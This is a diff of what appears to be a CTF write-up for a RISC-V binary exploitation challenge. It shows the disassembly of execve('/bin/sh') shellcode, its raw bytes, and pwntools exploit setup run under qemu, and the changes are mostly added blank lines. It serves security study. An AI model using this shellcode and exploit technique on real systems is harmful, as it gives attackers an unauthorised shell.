@@ -203,53 +203,79 @@ gdb调一下发现在echo不存在的文件的时候可以输入0x200个字节
 '''
 / (fcn) entry0 76
 
+
 |   entry0 ();
+
 
 |           0x000100b0      0111           addi sp, sp, -32 
 
+
 |           0x000100b2      06ec           sd ra, 24(sp)
+
 
 |           0x000100b4      22e8           sd s0, 16(sp)
 
+
 |           0x000100b6      13042102       addi s0, sp, 34
+
 
 |           0x000100ba      b767696e       lui a5, 0x6e696
 
+
 |           0x000100be      9387f722       addi a5, a5, 559
+
 
 |           0x000100c2      2330f4fe       sd a5, -32(s0)
 
+
 |           0x000100c6      b7776810       lui a5, 0x10687
+
 
 |           0x000100ca      33480801       xor a6, a6, a6
 
+
 |           0x000100ce      0508           addi a6, a6, 1
+
+
 
 |           0x000100d0      7208           slli a6, a6, 0x1c
 
+
 |           0x000100d2      b3870741       sub a5, a5, a6
+
 
 |           0x000100d6      9387f732       addi a5, a5, 815
 
+
 |           0x000100da      2332f4fe       sd a5, -28(s0)
+
 
 |           0x000100de      930704fe       addi a5, s0, -32
 
+
 |           0x000100e2      0146           li a2, 0
+
 
 |           0x000100e4      8145           li a1, 0
 
+
 |           0x000100e6      3e85           mv a0, a5
+
 
 |           0x000100e8      9308d00d       li a7, 221
 
+
 |           0x000100ec      93063007       li a3, 115
+
 
 |           0x000100f0      230ed1ee       sb a3, -260(sp)
 
+
 |           0x000100f4      9306e1ef       addi a3, sp, -258
 
+
 \           0x000100f8      6780e6ff       jr -2(a3)
+
 '''
 
 shellcode =  b'\x01\x11\x06\xec\x22\xe8\x13\x04'
@@ -428,7 +454,7 @@ libc=ELF("./libs/lib/"+libc_name)
 e=ELF("./"+binary_name)
 
 if local:
-  #p = process(["./qemu-riscv64",'-g','1234', "-L", "./libs", './'+binary_name])
+	#p = process(["./qemu-riscv64",'-g','1234', "-L", "./libs", './'+binary_name])
     
 	p = process(["./qemu-riscv64", "-L", "./libs", './'+binary_name])
 else:
